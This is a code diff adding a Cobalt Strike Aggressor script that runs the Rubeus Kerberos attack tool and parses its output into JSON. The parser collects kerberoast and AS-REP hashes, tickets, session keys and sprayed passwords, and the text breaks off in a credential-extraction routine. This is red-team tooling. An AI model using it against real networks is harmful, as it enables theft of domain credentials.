@@ -1,0 +1,1498 @@
+debug(7 | 34); # 34 is required for try/catch
+import java.io.File;
+
+# Rubeus Parser Aggressor Script
+# This example runs Rubeus with Cobalt Strike's native bexecute_assembly helper
+# and emits structured JSON from accumulated plain-text Rubeus output.
+#
+# Configure $rubeus_path in config/local.cna.
+# Usage: rubeus <arguments>
+# Example: rubeus kerberoast
+# Credential-store popup actions live in modules/rubeus/rubeus_extension.cna.
+
+global('$rubeus_path %rubeus_parser_state');
+$rubeus_path = "";
+%rubeus_parser_state = %();
+
+sub load_rubeus_config {
+    local('$config_path $file');
+
+    $config_path = script_resource("local.cna");
+    $file = [new File: $config_path];
+    if ([$file exists]) {
+        include($config_path);
+        return 1;
+    }
+
+    println("[Teams] Missing local config: " . $config_path);
+    return 0;
+}
+
+load_rubeus_config();
+
+sub __rubeus_json_hex {
+    local('$num $hex $digits $digit');
+    $num = $1;
+    $digits = "0123456789abcdef";
+    $hex = "";
+
+    if ($num == 0) {
+        $hex = "0";
+    }
+    else {
+        while ($num > 0) {
+            $digit = $num % 16;
+            $hex = substr($digits, $digit, $digit + 1) . $hex;
+            $num = ($num - $digit) / 16;
+        }
+    }
+
+    while (strlen($hex) < 4) {
+        $hex = "0" . $hex;
+    }
+
+    return substr($hex, strlen($hex) - 4, strlen($hex));
+}
+
+sub __rubeus_json_is_number {
+    local('$value $type');
+    $value = $1;
+
+    if ($value is $null) {
+        return 0;
+    }
+
+    $type = typeOf($value);
+    return iff(($type eq "class sleep.engine.types.LongValue") || ($type eq "class sleep.engine.types.DoubleValue"), 1, 0);
+}
+
+sub __rubeus_json_string {
+    local('$str $out $i $len $c $code');
+    $str = $1 . "";
+    $len = strlen($str);
+    $out = "\"";
+
+    for ($i = 0; $i < $len; $i++) {
+        $c = charAt($str, $i);
+        $code = asc($c);
+
+        if ($c eq "\\") {
+            $out .= "\\\\";
+        }
+        else if ($c eq "\"") {
+            $out .= "\\\"";
+        }
+        else if ($code == 8) {
+            $out .= "\\b";
+        }
+        else if ($code == 12) {
+            $out .= "\\f";
+        }
+        else if ($c eq "\n") {
+            $out .= "\\n";
+        }
+        else if ($c eq "\r") {
+            $out .= "\\r";
+        }
+        else if ($c eq "\t") {
+            $out .= "\\t";
+        }
+        else if ($code < 32) {
+            $out .= "\\u" . __rubeus_json_hex($code);
+        }
+        else {
+            $out .= $c;
+        }
+    }
+
+    return $out . "\"";
+}
+
+sub __rubeus_json_array {
+    local('$array $result $first $item');
+    $array = $1;
+    $result = "[";
+    $first = 1;
+
+    foreach $item ($array) {
+        if ($first == 0) {
+            $result .= ",";
+        }
+        $first = 0;
+        $result .= __rubeus_json_value($item);
+    }
+
+    return $result . "]";
+}
+
+sub __rubeus_json_object {
+    local('$object $result $first $key $value');
+    $object = $1;
+    $result = "{";
+    $first = 1;
+
+    foreach $key => $value ($object) {
+        if ($first == 0) {
+            $result .= ",";
+        }
+        $first = 0;
+        $result .= __rubeus_json_string($key) . ":" . __rubeus_json_value($value);
+    }
+
+    return $result . "}";
+}
+
+sub __rubeus_json_value {
+    local('$value $scalar $scalarLower');
+    $value = $1;
+
+    if ($value is $null) {
+        return "null";
+    }
+
+    if (-ishash $value) {
+        return __rubeus_json_object($value);
+    }
+    if (-isarray $value) {
+        return __rubeus_json_array($value);
+    }
+
+    $scalar = $value . "";
+    $scalarLower = [$scalar toLowerCase];
+
+    if (__rubeus_json_is_number($value)) {
+        return $scalar;
+    }
+    if ($scalarLower eq "true") {
+        return "true";
+    }
+    if ($scalarLower eq "false") {
+        return "false";
+    }
+
+    return __rubeus_json_string($scalar);
+}
+
+sub __rubeus_to_json {
+    return __rubeus_json_value($1);
+}
+
+sub __rubeus_path_separator {
+    return iff([[new String: cwd()] indexOf: "\\"] >= 0, "\\", "/");
+}
+
+sub __rubeus_is_absolute_path {
+    local('$path');
+    $path = $1;
+
+    if ($path is $null || $path eq "") {
+        return 0;
+    }
+
+    if (strlen($path) >= 1 && (charAt($path, 0) eq "/" || charAt($path, 0) eq "\\")) {
+        return 1;
+    }
+    if (strlen($path) >= 2 && charAt($path, 1) eq ":") {
+        return 1;
+    }
+
+    return 0;
+}
+
+sub __rubeus_normalize_parent_segments {
+    local('$path $sep $prefix $rest $part $first $second');
+    local('@parts @stack');
+    ($path, $sep) = @_;
+
+    if ($path is $null || $path eq "") {
+        return "";
+    }
+
+    $prefix = "";
+    $rest = $path;
+
+    if (strlen($path) >= 2 &&
+        (charAt($path, 0) eq "\\" || charAt($path, 0) eq "/") &&
+        (charAt($path, 1) eq "\\" || charAt($path, 1) eq "/")) {
+        $rest = $path;
+        while (strlen($rest) > 0 && (charAt($rest, 0) eq "\\" || charAt($rest, 0) eq "/")) {
+            $rest = substr($rest, 1);
+        }
+
+        @parts = split("[\\\\/]+", $rest);
+        if (size(@parts) >= 2) {
+            $first = @parts[0];
+            $second = @parts[1];
+            $prefix = $sep . $sep . $first . $sep . $second;
+            $rest = "";
+            if (size(@parts) > 2) {
+                $rest = join($sep, sublist(@parts, 2));
+            }
+        }
+    }
+    else if (strlen($path) >= 2 && charAt($path, 1) eq ":") {
+        $prefix = substr($path, 0, 2) . $sep;
+        $rest = substr($path, 2);
+        while (strlen($rest) > 0 && (charAt($rest, 0) eq "\\" || charAt($rest, 0) eq "/")) {
+            $rest = substr($rest, 1);
+        }
+    }
+    else if (strlen($path) >= 1 && (charAt($path, 0) eq "\\" || charAt($path, 0) eq "/")) {
+        $prefix = $sep;
+        $rest = substr($path, 1);
+    }
+
+    @parts = split("[\\\\/]+", $rest);
+    foreach $part (@parts) {
+        if ($part eq "" || $part eq ".") {
+            continue;
+        }
+        if ($part eq "..") {
+            if (size(@stack) > 0 && @stack[-1] ne "..") {
+                pop(@stack);
+            }
+            else if ($prefix eq "") {
+                push(@stack, $part);
+            }
+            continue;
+        }
+        push(@stack, $part);
+    }
+
+    if ($prefix ne "" && $prefix ne $sep && size(@stack) > 0 && charAt($prefix, strlen($prefix) - 1) ne "\\" && charAt($prefix, strlen($prefix) - 1) ne "/") {
+        return $prefix . $sep . join($sep, @stack);
+    }
+
+    return $prefix . join($sep, @stack);
+}
+
+sub __rubeus_resolved_path {
+    local('$path $sep $resolved');
+    $path = $1;
+
+    if ($path is $null || $path eq "") {
+        return "";
+    }
+
+    if (__rubeus_is_absolute_path($path) == 1) {
+        $resolved = $path;
+    }
+    else {
+        $sep = __rubeus_path_separator();
+        $resolved = cwd() . $sep . $path;
+    }
+
+    $sep = __rubeus_path_separator();
+    return getFileProper(__rubeus_normalize_parent_segments($resolved, $sep));
+}
+
+sub __rubeus_path_exists {
+    local('$path');
+    $path = __rubeus_resolved_path($1);
+
+    if ($path is $null || $path eq "") {
+        return 0;
+    }
+
+    return iff(-exists $path && -isFile $path, 1, 0);
+}
+
+sub __rubeus_starts_with {
+    local('$text $prefix');
+    ($text, $prefix) = @_;
+    return iff([[new String: ("" . $text)] indexOf: $prefix] == 0, 1, 0);
+}
+
+sub __rubeus_validate_config {
+    local('$resolved_path');
+
+    if ($rubeus_path eq "" || $rubeus_path is $null) {
+        println("[rubeus] Set \$rubeus_path in config/local.cna to your local Rubeus.exe path.");
+        return 0;
+    }
+
+    if (__rubeus_path_exists($rubeus_path) == 0) {
+        $resolved_path = __rubeus_resolved_path($rubeus_path);
+        println("[rubeus] Configured \$rubeus_path does not exist or is not a file: " . $rubeus_path . " (resolved: " . $resolved_path . ")");
+        return 0;
+    }
+
+    return 1;
+}
+
+__rubeus_validate_config();
+
+################### GENERAL HELPERS ###################
+
+sub __rubeus_trim {
+    return [[new String: ("" . $1)] trim];
+}
+
+sub __rubeus_is_luid {
+    local('$value');
+    $value = __rubeus_trim($1);
+    return iff($value ismatch "^0x[0-9a-fA-F]+$", 1, 0);
+}
+
+sub __rubeus_contains_nowrap {
+    local('$arguments');
+    $arguments = [[new String: ("" . $1)] toLowerCase];
+    return iff(($arguments eq "/nowrap") || ($arguments ismatch ".*\\s/nowrap\\s.*") || ($arguments ismatch "^/nowrap\\s.*") || ($arguments ismatch ".*\\s/nowrap$"), 1, 0);
+}
+
+sub __rubeus_command_name {
+    local('$arguments @parts');
+    $arguments = __rubeus_trim($1);
+    @parts = split(" ", $arguments);
+    if (size(@parts) == 0 || @parts[0] eq "") {
+        return "";
+    }
+    return lc(@parts[0]);
+}
+
+sub __rubeus_output_text {
+    local('$line');
+    $line = __rubeus_trim($1);
+
+    while (__rubeus_starts_with($line, "[*]") || __rubeus_starts_with($line, "[+]") || __rubeus_starts_with($line, "[-]")) {
+        $line = __rubeus_trim(substr($line, 3));
+    }
+
+    return $line;
+}
+
+sub __rubeus_should_add_nowrap {
+    local('$command');
+    $command = __rubeus_command_name($1);
+    return iff(($command eq "kerberoast") || ($command eq "asreproast") || ($command eq "dump") || ($command eq "asktgt") || ($command eq "asktgs") || ($command eq "monitor") || ($command eq "harvest") || ($command eq "tgtdeleg") || ($command eq "renew"), 1, 0);
+}
+
+sub __rubeus_contains_flag {
+    local('$arguments $flag');
+    ($arguments, $flag) = @_;
+    $arguments = [[new String: __rubeus_trim($arguments)] toLowerCase];
+    $flag = [[new String: __rubeus_trim($flag)] toLowerCase];
+    return iff(($arguments eq $flag) || ($arguments ismatch "^" . $flag . "\\s.*") || ($arguments ismatch ".*\\s" . $flag . "\\s.*") || ($arguments ismatch ".*\\s" . $flag . "$"), 1, 0);
+}
+
+sub __rubeus_contains_option_prefix {
+    local('$arguments $prefix @parts $part');
+    ($arguments, $prefix) = @_;
+    @parts = split(" ", __rubeus_trim($arguments));
+    $prefix = [[new String: __rubeus_trim($prefix)] toLowerCase];
+
+    foreach $part (@parts) {
+        if (__rubeus_starts_with([[new String: ("" . $part)] toLowerCase], $prefix) == 1) {
+            return 1;
+        }
+    }
+
+    return 0;
+}
+
+sub __rubeus_strip_flag {
+    local('$arguments $flag @parts @kept $part');
+    ($arguments, $flag) = @_;
+    @parts = split(" ", __rubeus_trim($arguments));
+    $flag = [[new String: __rubeus_trim($flag)] toLowerCase];
+
+    foreach $part (@parts) {
+        if ([[new String: ("" . $part)] toLowerCase] ne $flag) {
+            push(@kept, $part);
+        }
+    }
+
+    return join(" ", @kept);
+}
+
+sub __rubeus_normalize_key {
+    local('$key @chars @builder $ch $start_index $end_index');
+    $key = [[new String: __rubeus_trim($1)] toLowerCase];
+    @chars = split("", $key);
+
+    foreach $ch (@chars) {
+        if ($ch ismatch "[a-z0-9]") {
+            push(@builder, $ch);
+        }
+        else if (($ch eq " " || $ch eq "-" || $ch eq "/" || $ch eq ".") && (size(@builder) == 0 || @builder[-1] ne "_")) {
+            push(@builder, "_");
+        }
+    }
+
+    $key = join("", @builder);
+    if ($key eq "") {
+        return "";
+    }
+
+    $start_index = 0;
+    while ($start_index < strlen($key) && charAt($key, $start_index) eq "_") {
+        $start_index++;
+    }
+
+    $end_index = strlen($key) - 1;
+    while ($end_index >= $start_index && charAt($key, $end_index) eq "_") {
+        $end_index--;
+    }
+
+    if ($end_index < $start_index) {
+        return "";
+    }
+
+    return substr($key, $start_index, $end_index + 1);
+}
+
+sub __rubeus_canonical_key {
+    local('$key');
+    $key = $1;
+
+    if (($key eq "base64key") || ($key eq "base64_key")) {
+        return "base64_key";
+    }
+    if (($key eq "base64_ticket_kirbi") || ($key eq "base64ticket_kirbi") || ($key eq "base64ticketkirbi") || ($key eq "base64_encoded_ticket") || ($key eq "base64encodedticket")) {
+        return "base64encodedticket";
+    }
+    if (($key eq "kirbi") || ($key eq "ticket_kirbi") || ($key eq "encodedticket") || ($key eq "encoded_ticket")) {
+        return "base64encodedticket";
+    }
+    if (($key eq "ccache") || ($key eq "base64ccache") || ($key eq "base64_ccache")) {
+        return "ccache";
+    }
+    if (($key eq "base64sessionkey") || ($key eq "base64_session_key")) {
+        return "base64sessionkey";
+    }
+
+    return $key;
+}
+
+sub __rubeus_append_value {
+    local('$current $next $key');
+    ($current, $next, $key) = @_;
+
+    if ($current is $null) {
+        $current = "";
+    }
+    if ($next is $null || $next eq "") {
+        return $current;
+    }
+
+    if ($current eq "") {
+        return $next;
+    }
+
+    if (__rubeus_is_blob_field($key) == 1) {
+        return $current . $next;
+    }
+
+    return $current . " " . $next;
+}
+
+sub __rubeus_is_blob_field {
+    local('$key');
+    $key = $1;
+    return iff(($key eq "hash") || ($key eq "base64encodedticket") || ($key eq "base64_key") || ($key eq "base64sessionkey") || ($key eq "kerberoast_hash") || ($key eq "ccache"), 1, 0);
+}
+
+sub __rubeus_parse_labeled_line {
+    local('$line $text $separator $key $value');
+    $line = "" . $1;
+    $text = iff(__rubeus_starts_with($line, "[*] "), substr($line, 4), $line);
+    if (__rubeus_starts_with($text, "Action:") || __rubeus_starts_with($text, "NOTICE:")) {
+        $separator = [$text indexOf: ":"];
+    }
+    else {
+        $separator = [$text indexOf: " :"];
+        if ($separator < 0) {
+            $separator = [$text indexOf: ":"];
+        }
+    }
+
+    if ($separator < 0) {
+        return %();
+    }
+
+    $key = __rubeus_trim([$text substring: 0, $separator]);
+    $value = __rubeus_trim([$text substring: $separator + 1]);
+    if (__rubeus_starts_with($value, ":")) {
+        $value = __rubeus_trim(substr($value, 1));
+    }
+
+    if ($key eq "") {
+        return %();
+    }
+
+    return %(key => $key, normalized_key => __rubeus_canonical_key(__rubeus_normalize_key($key)), value => $value);
+}
+
+sub __rubeus_is_structured_labeled_line {
+    local('$line $text');
+    $line = "" . $1;
+    $text = iff(__rubeus_starts_with($line, "[*] "), substr($line, 4), $line);
+
+    if (__rubeus_starts_with($text, "Action:") || __rubeus_starts_with($text, "NOTICE:")) {
+        return 1;
+    }
+
+    return iff(([$text indexOf: " :"] >= 0) || ([$text indexOf: ":"] >= 0), 1, 0);
+}
+
+sub __rubeus_push_unique {
+    local('@items $value $seen $item');
+    (@items, $value) = @_;
+    $seen = 0;
+
+    foreach $item (@items) {
+        if ($item eq $value) {
+            $seen = 1;
+        }
+    }
+
+    if ($seen == 0) {
+        push(@items, $value);
+    }
+
+    return @items;
+}
+
+sub __rubeus_triage_table_rows {
+    local('$text @rows @lines $line $clean @fields $offset $luid $username $service $endtime');
+    $text = $1;
+
+    @lines = split("\n", "" . $text);
+    foreach $line (@lines) {
+        $clean = __rubeus_output_text($line);
+
+        if ($clean eq "" || [$clean indexOf: "|"] < 0 || [$clean indexOf: "---"] >= 0) {
+            continue;
+        }
+
+        @fields = split("\\|", $clean);
+        $offset = iff(size(@fields) > 0 && __rubeus_trim(@fields[0]) eq "", 1, 0);
+        if (size(@fields) < $offset + 4) {
+            continue;
+        }
+
+        $luid = __rubeus_trim(@fields[$offset]);
+        $username = __rubeus_trim(@fields[$offset + 1]);
+        $service = __rubeus_trim(@fields[$offset + 2]);
+        $endtime = __rubeus_trim(@fields[$offset + 3]);
+
+        if ($luid eq "" || lc($luid) eq "luid" || __rubeus_starts_with($luid, "---") || __rubeus_is_luid($luid) == 0) {
+            continue;
+        }
+
+        push(@rows, @($luid, $username, $service, $endtime));
+    }
+
+    return @rows;
+}
+
+################### PARSER ENTRY HELPERS ###################
+
+sub __rubeus_new_entry {
+    return %(artifacts => @());
+}
+
+sub __rubeus_entry_has_content {
+    local('%entry $key');
+    %entry = $1;
+
+    foreach $key (keys(%entry)) {
+        if ($key eq "artifacts") {
+            if (size(%entry[$key]) > 0) {
+                return 1;
+            }
+        }
+        else if (%entry[$key] !is $null && %entry[$key] ne "") {
+            return 1;
+        }
+    }
+
+    return 0;
+}
+
+sub __rubeus_should_finalize_before_hash {
+    local('%entry');
+    %entry = $1;
+
+    if (__rubeus_entry_has_content(%entry) == 0) {
+        return 0;
+    }
+
+    if (%entry["hash"] !is $null && %entry["hash"] ne "") {
+        return 1;
+    }
+
+    return 0;
+}
+
+sub __rubeus_finalize_entry {
+    local('%output %entry @entries');
+    (%output, %entry) = @_;
+
+    if (__rubeus_entry_has_content(%entry) == 0) {
+        return %output;
+    }
+
+    @entries = %output["entries"];
+    push(@entries, %entry);
+    %output["entries"] = @entries;
+    return %output;
+}
+
+sub __rubeus_is_entry_field {
+    local('$key');
+    $key = $1;
+    # Roasting fields
+    if (($key eq "samaccountname") || ($key eq "distinguishedname") || ($key eq "serviceprincipalname") || ($key eq "pwdlastset") || ($key eq "supported_etypes") || ($key eq "hash")) {
+        return 1;
+    }
+    # Ticket describe / asktgt / asktgs / dump fields
+    if (($key eq "username") || ($key eq "userid") || ($key eq "userprincipalname") || ($key eq "userrealm") || ($key eq "servicename") || ($key eq "servicerealm") || ($key eq "starttime") || ($key eq "endtime") || ($key eq "renewtill") || ($key eq "flags") || ($key eq "keytype") || ($key eq "base64_key") || ($key eq "base64encodedticket") || ($key eq "kerberoast_hash") || ($key eq "ccache")) {
+        return 1;
+    }
+    # dump fields
+    if (($key eq "clientname") || ($key eq "domainname") || ($key eq "targetname") || ($key eq "targetdomainname") || ($key eq "alttargetdomainname") || ($key eq "sessionkeytype") || ($key eq "base64sessionkey") || ($key eq "ticketflags") || ($key eq "encodedticketsize") || ($key eq "renewuntil")) {
+        return 1;
+    }
+    # s4u / changepw / misc fields
+    if (($key eq "user") || ($key eq "processid") || ($key eq "luid")) {
+        return 1;
+    }
+    return 0;
+}
+
+sub __rubeus_is_summary_field {
+    local('$key');
+    $key = $1;
+    return iff(($key ismatch "^total_.*$") || ($key ismatch "^.*count$"), 1, 0);
+}
+
+sub __rubeus_is_hashlike_line {
+    local('$line');
+    $line = $1;
+    # Use simple prefix matching to avoid regex dollar-sign interpolation issues.
+    # \$ in Sleep string literals produces a literal dollar sign character.
+    return iff(__rubeus_starts_with($line, "\$krb5tgs\$") || __rubeus_starts_with($line, "\$krb5asrep\$"), 1, 0);
+}
+
+# Detect lines from brute/spray output like: [+] STUPENDOUS => user:password
+sub __rubeus_is_brute_result_line {
+    local('$line');
+    $line = $1;
+    return iff(__rubeus_starts_with($line, "[+] STUPENDOUS =>"), 1, 0);
+}
+
+# Detect lines from preauthscan like: [*] user: Pre-Auth Not Required
+sub __rubeus_is_preauthscan_line {
+    local('$line $lower');
+    $line = $1;
+    $lower = [[new String: ("" . $line)] toLowerCase];
+    return iff(([[new String: ("" . $lower)] indexOf: "pre-auth not required"] >= 0) || ([[new String: ("" . $lower)] indexOf: "pre-auth required"] >= 0), 1, 0);
+}
+
+# Detect renewal target lines like: [*] Building TGS-REQ renewal for: 'DOMAIN\user'
+sub __rubeus_is_renewal_for_line {
+    local('$line');
+    $line = "" . $1;
+    return iff(__rubeus_starts_with($line, "[*] Building ") == 1 && [[new String: $line] indexOf: " renewal for:"] >= 0, 1, 0);
+}
+
+# Extract DOMAIN\user from a Rubeus renewal target line
+sub __rubeus_parse_renewal_principal {
+    local('$line $text $separator $principal $slash_idx');
+    $line = "" . $1;
+    $text = iff(__rubeus_starts_with($line, "[*] "), substr($line, 4), $line);
+    $separator = [[new String: $text] indexOf: ":"];
+
+    if ($separator < 0) {
+        return %();
+    }
+
+    $principal = __rubeus_trim([[new String: $text] substring: $separator + 1]);
+    if (strlen($principal) >= 2 && charAt($principal, 0) eq "'" && charAt($principal, strlen($principal) - 1) eq "'") {
+        $principal = substr($principal, 1, strlen($principal) - 1);
+    }
+
+    $slash_idx = [[new String: $principal] indexOf: "\\"];
+    if ($slash_idx > 0) {
+        return %(userrealm => substr($principal, 0, $slash_idx), username => substr($principal, $slash_idx + 1));
+    }
+
+    return %(username => $principal);
+}
+
+################### OUTPUT PARSER ###################
+
+# Detect entry-start lines: SamAccountName, ServiceName (for dump/describe), User (for monitor)
+sub __rubeus_is_entry_start_line {
+    local('$trimmed %line_info $nk');
+    $trimmed = $1;
+    if (__rubeus_starts_with($trimmed, "[*] ") == 0 || __rubeus_is_structured_labeled_line($trimmed) == 0) {
+        return 0;
+    }
+    %line_info = __rubeus_parse_labeled_line($trimmed);
+    $nk = %line_info["normalized_key"];
+    return iff(($nk eq "samaccountname") || ($nk eq "servicename") || ($nk eq "clientname"), 1, 0);
+}
+
+sub __rubeus_parse_output {
+    local('$text $command %output %entry @lines $line $trimmed %line_info @items $last_target_type $last_target_key');
+    ($text, $command) = @_;
+    $last_target_type = "";
+    $last_target_key = "";
+
+    %output = %(
+        tool => "rubeus",
+        command => $command,
+        action => "",
+        summary => %(),
+        notices => @(),
+        messages => @(),
+        details => %(),
+        entries => @(),
+        artifacts => @()
+    );
+    %entry = __rubeus_new_entry();
+
+    @lines = split("\n", "" . $text);
+
+    foreach $line (@lines) {
+        $trimmed = __rubeus_trim($line);
+
+        if ($trimmed eq "") {
+            # Blank lines usually reset continuation, but ticket/blob content may follow
+            # an empty separator line after the label header.
+            if (__rubeus_is_blob_field($last_target_key) == 0) {
+                $last_target_type = "";
+                $last_target_key = "";
+            }
+            continue;
+        }
+
+        # --- Entry boundary detection: finalize previous entry before starting a new one ---
+        if (__rubeus_is_entry_start_line($trimmed) == 1 || __rubeus_is_brute_result_line($trimmed) == 1 || (__rubeus_is_hashlike_line($trimmed) == 1 && __rubeus_should_finalize_before_hash(%entry) == 1)) {
+            if (__rubeus_entry_has_content(%entry) == 1) {
+                %output = __rubeus_finalize_entry(%output, %entry);
+                %entry = __rubeus_new_entry();
+            }
+        }
+
+        # --- Classify the line ---
+
+        # 1. [*] Action: line
+        if (__rubeus_starts_with($trimmed, "[*] Action:")) {
+            %line_info = __rubeus_parse_labeled_line($trimmed);
+            %output = __rubeus_finalize_entry(%output, %entry);
+            %entry = __rubeus_new_entry();
+            %output["action"] = %line_info["value"];
+            %output["details"]["action"] = %line_info["value"];
+            # Reset continuation so subsequent lines don't append to action
+            $last_target_type = "";
+            $last_target_key = "";
+        }
+        # 2. [*] NOTICE: line
+        else if (__rubeus_starts_with($trimmed, "[*] NOTICE:")) {
+            @items = __rubeus_push_unique(%output["notices"], __rubeus_trim(substr($trimmed, 12)));
+            %output["notices"] = @items;
+            $last_target_type = "notice";
+            $last_target_key = "";
+        }
+        # 3. Hash line ($krb5tgs$ or $krb5asrep$) — always assign to current entry
+        else if (__rubeus_is_hashlike_line($trimmed) == 1) {
+            %entry["hash"] = $trimmed;
+            $last_target_type = "entry";
+            $last_target_key = "hash";
+        }
+        # 4. Brute/spray result: [+] STUPENDOUS => user:password
+        else if (__rubeus_is_brute_result_line($trimmed) == 1) {
+            local('$brute_text $colon_idx $brute_user $brute_pass');
+            $brute_text = __rubeus_trim(substr($trimmed, strlen("[+] STUPENDOUS => ")));
+            $colon_idx = [[new String: ("" . $brute_text)] indexOf: ":"];
+            if ($colon_idx > 0) {
+                $brute_user = __rubeus_trim([[new String: ("" . $brute_text)] substring: 0, $colon_idx]);
+                $brute_pass = __rubeus_trim([[new String: ("" . $brute_text)] substring: $colon_idx + 1]);
+                %entry["username"] = $brute_user;
+                %entry["password"] = $brute_pass;
+            }
+            else {
+                %entry["result"] = $brute_text;
+            }
+            $last_target_type = "entry";
+            $last_target_key = "";
+        }
+        # 5. Preauthscan result line
+        else if (__rubeus_is_preauthscan_line($trimmed) == 1) {
+            local('$scan_text $scan_user $scan_status $scan_colon');
+            $scan_text = iff(__rubeus_starts_with($trimmed, "[*] "), __rubeus_trim(substr($trimmed, 4)), $trimmed);
+            $scan_colon = [[new String: ("" . $scan_text)] indexOf: ":"];
+            if ($scan_colon > 0) {
+                $scan_user = __rubeus_trim([[new String: ("" . $scan_text)] substring: 0, $scan_colon]);
+                $scan_status = __rubeus_trim([[new String: ("" . $scan_text)] substring: $scan_colon + 1]);
+                if (__rubeus_entry_has_content(%entry) == 1) {
+                    %output = __rubeus_finalize_entry(%output, %entry);
+                    %entry = __rubeus_new_entry();
+                }
+                %entry["username"] = $scan_user;
+                %entry["preauth_status"] = $scan_status;
+            }
+            $last_target_type = "entry";
+            $last_target_key = "";
+        }
+        # 6. Renew output target: [*] Building TGS-REQ renewal for: 'DOMAIN\user'
+        else if (__rubeus_is_renewal_for_line($trimmed) == 1) {
+            local('%renewal_principal');
+            %renewal_principal = __rubeus_parse_renewal_principal($trimmed);
+
+            if (%renewal_principal["username"] !is $null && %renewal_principal["username"] ne "") {
+                %entry["username"] = %renewal_principal["username"];
+            }
+            if (%renewal_principal["userrealm"] !is $null && %renewal_principal["userrealm"] ne "") {
+                %entry["userrealm"] = %renewal_principal["userrealm"];
+            }
+
+            %output["details"]["renewal_principal"] = iff(%renewal_principal["userrealm"] !is $null && %renewal_principal["userrealm"] ne "", %renewal_principal["userrealm"] . "\\" . %renewal_principal["username"], %renewal_principal["username"]);
+            $last_target_type = "entry";
+            $last_target_key = "";
+        }
+        # 7. [*] Key : Value structured labeled line
+        else if (__rubeus_starts_with($trimmed, "[*] ") && (__rubeus_is_structured_labeled_line($trimmed) == 1)) {
+            %line_info = __rubeus_parse_labeled_line($trimmed);
+
+            if (__rubeus_is_entry_field(%line_info["normalized_key"]) == 1) {
+                %entry[%line_info["normalized_key"]] = %line_info["value"];
+                $last_target_type = "entry";
+                $last_target_key = %line_info["normalized_key"];
+            }
+            else if (__rubeus_is_summary_field(%line_info["normalized_key"]) == 1) {
+                %output["summary"][%line_info["normalized_key"]] = %line_info["value"];
+                $last_target_type = "summary";
+                $last_target_key = %line_info["normalized_key"];
+            }
+            else {
+                %output["details"][%line_info["normalized_key"]] = %line_info["value"];
+                $last_target_type = "detail";
+                $last_target_key = %line_info["normalized_key"];
+            }
+        }
+        # 7. Non-labeled [*] lines or [+]/[-] status lines — messages
+        else if (__rubeus_starts_with($trimmed, "[*] ") || __rubeus_starts_with($trimmed, "[+] ") || __rubeus_starts_with($trimmed, "[-] ")) {
+            local('$msg_prefix_len');
+            $msg_prefix_len = 4;
+            if ($last_target_type eq "notice" && size(%output["notices"]) > 0 && __rubeus_starts_with($trimmed, "[*] ")) {
+                @items = %output["notices"];
+                @items[size(@items) - 1] = @items[size(@items) - 1] . " " . __rubeus_trim(substr($trimmed, $msg_prefix_len));
+                %output["notices"] = @items;
+            }
+            else {
+                @items = __rubeus_push_unique(%output["messages"], __rubeus_trim(substr($trimmed, $msg_prefix_len)));
+                %output["messages"] = @items;
+                $last_target_type = "message";
+                $last_target_key = "";
+            }
+        }
+        # 8. Non-labeled key : value lines (used by dump, describe, etc. without [*] prefix)
+        else if ([$trimmed indexOf: " :"] >= 0 || [$trimmed indexOf: "  :"] >= 0) {
+            %line_info = __rubeus_parse_labeled_line($trimmed);
+            if (%line_info["normalized_key"] ne "" && %line_info["normalized_key"] !is $null) {
+                if (__rubeus_is_entry_field(%line_info["normalized_key"]) == 1) {
+                    %entry[%line_info["normalized_key"]] = %line_info["value"];
+                    $last_target_type = "entry";
+                    $last_target_key = %line_info["normalized_key"];
+                }
+                else {
+                    %output["details"][%line_info["normalized_key"]] = %line_info["value"];
+                    $last_target_type = "detail";
+                    $last_target_key = %line_info["normalized_key"];
+                }
+            }
+            else {
+                # Fallback: treat as continuation or artifact
+                if ($last_target_type eq "entry" && $last_target_key ne "" && %entry[$last_target_key] !is $null) {
+                    %entry[$last_target_key] = __rubeus_append_value(%entry[$last_target_key], $trimmed, $last_target_key);
+                }
+                else {
+                    @items = __rubeus_push_unique(%output["artifacts"], $trimmed);
+                    %output["artifacts"] = @items;
+                    $last_target_type = "artifact";
+                    $last_target_key = "";
+                }
+            }
+        }
+        # 9. Continuation / artifact lines
+        else {
+            if ($last_target_type eq "entry" && $last_target_key ne "" && %entry[$last_target_key] !is $null) {
+                %entry[$last_target_key] = __rubeus_append_value(%entry[$last_target_key], $trimmed, $last_target_key);
+            }
+            else if ($last_target_type eq "detail" && $last_target_key ne "" && %output["details"][$last_target_key] !is $null) {
+                %output["details"][$last_target_key] = __rubeus_append_value(%output["details"][$last_target_key], $trimmed, $last_target_key);
+            }
+            else if ($last_target_type eq "summary" && $last_target_key ne "" && %output["summary"][$last_target_key] !is $null) {
+                %output["summary"][$last_target_key] = __rubeus_append_value(%output["summary"][$last_target_key], $trimmed, $last_target_key);
+            }
+            else if (__rubeus_entry_has_content(%entry) == 1) {
+                @items = __rubeus_push_unique(%entry["artifacts"], $trimmed);
+                %entry["artifacts"] = @items;
+                $last_target_type = "artifact";
+                $last_target_key = "";
+            }
+            else {
+                @items = __rubeus_push_unique(%output["artifacts"], $trimmed);
+                %output["artifacts"] = @items;
+                $last_target_type = "artifact";
+                $last_target_key = "";
+            }
+        }
+    }
+
+    %output = __rubeus_finalize_entry(%output, %entry);
+    if (__rubeus_command_name($command) eq "triage") {
+        %output["triage"] = __rubeus_triage_table_rows($text);
+    }
+
+    return %output;
+}
+
+################### PARSER STATE HELPERS ###################
+
+sub __rubeus_new_state {
+    return %(
+        parser_logged => 0,
+        emitted_signature => "",
+        emitted_credentials => %(),
+        command => "",
+        raw_output => "",
+        parsed_output => %(),
+        debug_json => 0,
+        outfile_requested => 0,
+        outfile_warning_logged => 0,
+        triage_table_signature => "",
+        user_defined_browser_warning_logged => 0
+    );
+}
+
+sub __rubeus_log_result_text {
+    local('$bid $text @lines $line');
+    ($bid, $text) = @_;
+    @lines = split("\n", "" . $text);
+
+    foreach $line (@lines) {
+        if ($line !is $null && $line ne "") {
+            blog($bid, $line);
+        }
+    }
+}
+
+sub __rubeus_try_open_user_defined_browser {
+    local('$tableID $tabName @columnNames @rows @columnWidths %callbackHints');
+    ($tableID, $tabName, @columnNames, @rows, @columnWidths, %callbackHints) = @_;
+
+    try {
+        openUserDefinedBrowser($tableID, $tabName, @columnNames, @rows, @columnWidths, %callbackHints);
+        return 1;
+    }
+    catch $e {
+        return 0;
+    }
+}
+
+################### CREDENTIAL EXTRACTION ###################
+
+sub __rubeus_parse_tgs_hash {
+    local('$hash $tail @parts $user $realm $service');
+    $hash = "" . $1;
+
+    if (__rubeus_starts_with($hash, "\$krb5tgs\$") == 0) {
+        return %();
+    }
+
+    $tail = substr($hash, strlen("\$krb5tgs\$"));
